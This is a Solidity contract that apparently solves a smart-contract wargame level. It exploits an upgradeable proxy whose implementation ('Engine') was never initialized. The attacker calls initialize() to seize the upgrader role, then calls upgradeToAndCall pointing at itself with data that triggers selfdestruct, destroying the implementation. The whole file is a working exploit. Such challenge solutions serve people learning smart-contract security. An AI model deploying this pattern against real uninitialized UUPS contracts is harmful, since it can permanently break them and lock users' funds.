// SPDX-License-Identifier: MIT
pragma solidity <0.8.0;

interface IEngine {
    function upgradeToAndCall(address newImplementation, bytes memory data) external; 
    function initialize() external;  
}

contract EngineAttacker {
    IEngine public challenge;

    constructor(address challengeAddress) {
        challenge = IEngine(challengeAddress);
    }

    function attack() public payable { 
        //call initialize to set this contract as upgrader
        challenge.initialize();

        //call upgradeToAndCall => provide address of attacker & data to call destroy on attacker contract  
        bytes memory destroyData = abi.encodeWithSelector((EngineAttacker(address(this))).destroy.selector);        
        challenge.upgradeToAndCall(address(this), destroyData);  
    }

    function destroy() public {
        selfdestruct(payable(msg.sender));
    } 
   
}